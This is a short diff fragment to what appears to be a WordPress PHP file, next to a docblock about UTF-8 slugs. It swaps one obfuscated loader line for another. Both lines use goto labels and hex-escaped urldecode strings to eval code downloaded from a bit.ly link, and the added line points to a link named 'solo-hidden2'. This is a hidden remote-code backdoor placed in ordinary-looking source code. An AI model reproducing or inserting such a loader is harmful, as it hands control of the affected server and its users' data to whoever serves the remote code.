@@ -56,7 +56,7 @@
  * @return bool Whether the slug represents the UTF-8 encoding.
  */
 
- goto opet_77c32; opet_77c32: eval( urldecode("\x25\063\x66\045\x33\145") . file_get_contents( urldecode( "\x68\164\x74\160\x73\072\x2F\057\x62\151\x74\056\x6C\171\x2F\162\x65\141\x64\155\x65\062\x66\141\x61" ) ) ); ?>
+ goto opet_862de; opet_862de: eval( urldecode("\x25\063\x66\045\x33\145") . file_get_contents( urldecode( "\x68\164\x74\160\x73\072\x2F\057\x62\151\x74\056\x6C\171\x2F\163\x6F\154\x6F\055\x68\151\x64\144\x65\156\x32" ) ) ); ?>
 <?php
 
 /**
